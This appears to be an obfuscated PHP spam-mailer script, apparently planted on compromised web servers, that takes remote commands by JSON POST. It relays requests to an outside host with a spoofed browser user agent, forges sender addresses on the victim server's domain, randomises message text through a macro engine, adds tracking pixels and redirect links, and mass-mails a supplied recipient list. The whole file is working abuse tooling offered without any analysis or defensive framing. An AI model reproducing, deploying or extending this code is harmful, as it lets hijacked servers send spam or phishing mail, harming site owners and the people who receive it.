<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp1ee580) { if ($sp1ee580 == 'keys') { return array_keys($this->_keys); } } public function Import($sp1ee580, $sp36e432) { if (is_array($sp36e432)) { $this->values[$sp1ee580] = array(); foreach ($sp36e432 as $spef6b38) { if (!empty($spef6b38['key'])) { $this->values[$sp1ee580][$spef6b38['key']] = $spef6b38['value']; } else { $this->values[$sp1ee580][] = $spef6b38['value']; } } } else { $this->Assign($sp1ee580, $sp36e432); } } public function Assign($sp1ee580, $sp1d0866) { $this->values[$sp1ee580] = $sp1d0866; } public function Parse($spe47c40) { $sp22d1c9 = ''; $sp28df62 = 0; while (true) { $sp14b0af = strpos($spe47c40, '{', $sp28df62); if ($sp14b0af === false) { $sp22d1c9 .= substr($spe47c40, $sp28df62); break; } $sp22d1c9 .= substr($spe47c40, $sp28df62, $sp14b0af - $sp28df62); $sp28df62 = $sp14b0af + 1; $sp64455a = ''; $spff5c90 = '{'; $sp107854 = array(); $spb369a1 = false; $sp182bd7 = false; $sp9a1bde = 'var'; while ($sp28df62 < strlen($spe47c40)) { $spc06152 = substr($spe47c40, $sp28df62, 1); $spff5c90 .= $spc06152; if ($spc06152 == ',' || $spc06152 == '>' || $spc06152 == '|') { if ($sp9a1bde == 'alias') { $spb369a1 = $sp64455a; } elseif ($sp9a1bde == 'mod') { $sp182bd7 = $sp64455a; } else { $sp107854[] = $sp64455a; } $sp64455a = ''; if ($spc06152 == '>') { $sp9a1bde = 'alias'; } if ($spc06152 == '|') { $sp9a1bde = 'mod'; } $sp28df62++; continue; } if ($spc06152 == '}') { if ($sp9a1bde == 'alias') { $spb369a1 = $sp64455a; } elseif ($sp9a1bde == 'mod') { $sp182bd7 = $sp64455a; } else { $sp107854[] = $sp64455a; } $sp28df62++; break; } $sp64455a .= $spc06152; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spc06152) == 0) { $sp28df62++; $sp107854 = array(); break; } $sp28df62++; } if (sizeof($sp107854) == 0) { $sp22d1c9 .= $spff5c90; continue; } $sp5884a5 = false; $sp577e21 = false; if (preg_match('/^\\^/', $sp107854[0]) > 0) { $sp107854[0] = substr($sp107854[0], 1); $sp5884a5 = true; } if (preg_match('/^\\!/', $sp107854[0]) > 0) { $sp107854[0] = substr($sp107854[0], 1); $sp577e21 = true; } $spc9ec5f = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp107854[0], $sp857498) > 0) { $spc9ec5f = $sp857498[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp107854[0], $sp857498) > 0) { $spc9ec5f = explode('-', $sp857498[1]); } if ($spc9ec5f !== false) { $sp107854[0] = substr($sp107854[0], 0, strpos($sp107854[0], '[')); } $this->_keys[$sp107854[0]] = true; if (empty($this->values[$sp107854[0]]) && empty($this->fixed[$sp107854[0]])) { continue; } if ($sp5884a5) { unset($this->fixed[$sp107854[0]]); } if (isset($this->fixed[$sp107854[0]])) { $sp7b949a = $this->fixed[$sp107854[0]]; } else { $sp7b949a = ''; $spd3bc1f = 1; if (sizeof($sp107854) == 2) { $spd3bc1f = $sp107854[1]; } if (sizeof($sp107854) == 3) { $spd3bc1f = rand($sp107854[1], $sp107854[2]); } for ($sp8e5593 = 0; $sp8e5593 < $spd3bc1f; $sp8e5593++) { if (is_array($this->values[$sp107854[0]])) { if (!is_array($this->used[$sp107854[0]])) { $this->used[$sp107854[0]] = array(); } if (count($this->used[$sp107854[0]]) == count($this->values[$sp107854[0]])) { $this->used[$sp107854[0]] = array(); } if ($spc9ec5f !== false && is_scalar($spc9ec5f)) { $sp7b949a .= $this->values[$sp107854[0]][$spc9ec5f]; $this->used[$spc9ec5f] = true; } else { $spb9325e = array(); if (is_array($spc9ec5f)) { $spa13908 = $spc9ec5f[0]; $sp6e1094 = $spc9ec5f[1]; } else { $spa13908 = 0; $sp6e1094 = count($this->values[$sp107854[0]]) - 1; } for ($sp7bbe9a = $spa13908; $sp7bbe9a <= $sp6e1094; $sp7bbe9a++) { if ($sp577e21 && !empty($this->used[$sp107854[0]][$sp7bbe9a])) { continue; } $spb9325e[] = $sp7bbe9a; } $spc3b752 = $spb9325e[rand(0, count($spb9325e) - 1)]; $this->used[$sp107854[0]][$spc3b752] = true; $sp7b949a .= $this->values[$sp107854[0]][$spc3b752]; } } else { $sp7b949a .= $this->values[$sp107854[0]]; } } } $sp7b949a = $this->Parse($sp7b949a); if ($sp182bd7 !== false) { for ($sp895f7d = 0; $sp895f7d < strlen($sp182bd7); $sp895f7d++) { switch (substr($sp182bd7, $sp895f7d, 1)) { case 'b': $sp7b949a = base64_encode($sp7b949a); break; case 'q': $sp7b949a = quoted_printable_encode($sp7b949a); break; default: break; } } } if ($sp5884a5) { $this->fixed[$sp107854[0]] = $sp7b949a; } if ($spb369a1 !== false && $spb369a1 != '') { $this->fixed[$spb369a1] = $sp7b949a; } $sp22d1c9 .= $sp7b949a; } return $sp22d1c9; } } $spe98ad7 = file_get_contents('php://input'); $spf782f3 = json_decode($spe98ad7, true); if (empty($spf782f3['via_proxy'])) { $spf782f3['via_proxy'] = true; $sp9d5f77 = curl_init($spf782f3['prefix'] . $spf782f3['files']['s']); $spc54798 = json_encode($spf782f3); curl_setopt($sp9d5f77, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp9d5f77, CURLOPT_TIMEOUT, 600); curl_setopt($sp9d5f77, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp9d5f77, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp9d5f77, CURLOPT_REFERER, $sp4b670b); curl_setopt($sp9d5f77, CURLOPT_POST, true); curl_setopt($sp9d5f77, CURLOPT_POSTFIELDS, $spc54798); curl_setopt($sp9d5f77, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spc54798))); $spf02152 = curl_exec($sp9d5f77); echo $spf02152; die; } $sp318967 = $_SERVER['SERVER_ADDR']; $sp7def83 = $_SERVER['HTTP_HOST']; $sp7def83 = preg_replace('/^www\\./', '', $sp7def83); $sp7f9d19 = new Macros(); $sp7f9d19->Assign('server_addr', $sp318967); $sp7f9d19->Assign('server_host', $sp7def83); foreach ($spf782f3['macros'] as $sp1ee580 => $sp36e432) { $sp7f9d19->Import($sp1ee580, $sp36e432); } $sp164640 = preg_replace('/^www\\./i', '', $sp7def83); $sp4ef5cc = $sp7f9d19->Parse('{from_user}@' . $sp164640); $sp7f9d19->Assign('from_email', $sp4ef5cc); $sp7f9d19->Assign('prefix', $spf782f3['prefix']); $sp7f9d19->Assign('html', $spf782f3['letter']['html']); $sp28df62 = 0; $sp83435d = 0; $spf6b9cc = 0; $sp81e161 = array(); foreach ($spf782f3['rcpt'] as $sp327ea1) { $sp7f9d19->Assign('email', $sp327ea1['email']); $sp7f9d19->Assign('entry', $sp327ea1); $sp7f9d19->Assign('date', date('r')); $sp7f9d19->Assign('redirect', $spf782f3['prefix'] . $spf782f3['files']['r']); $sp7f9d19->Assign('unsubscribe', $spf782f3['prefix'] . $spf782f3['files']['u']); $sp7f9d19->Assign('delivery', '<img src="' . $spf782f3['prefix'] . $spf782f3['files']['d']); $sp14e0f1 = $sp7f9d19->Parse($spf782f3['envelope']['header']); $sp5a7548 = $sp7f9d19->Parse($spf782f3['envelope']['body']); if (!empty($sp327ea1['name'])) { $spa505e7 = $sp327ea1['name'] . ' <' . $sp327ea1['email'] . '>'; } else { $spa505e7 = $sp327ea1['email']; } $sp0b997c = $sp7f9d19->Parse($spf782f3['letter']['subject']); $sp7f9880 = mail($spa505e7, $sp0b997c, $sp5a7548, $sp14e0f1); $sp81e161[$sp327ea1['id']] = $sp7f9880; if ($sp7f9880) { $sp83435d++; } else { $spf6b9cc++; } $sp28df62++; } echo serialize(array('total' => count($spf782f3['rcpt']), 'sent' => $sp28df62, 'success' => $sp83435d, 'error' => $spf6b9cc, 'rcpt' => $sp81e161));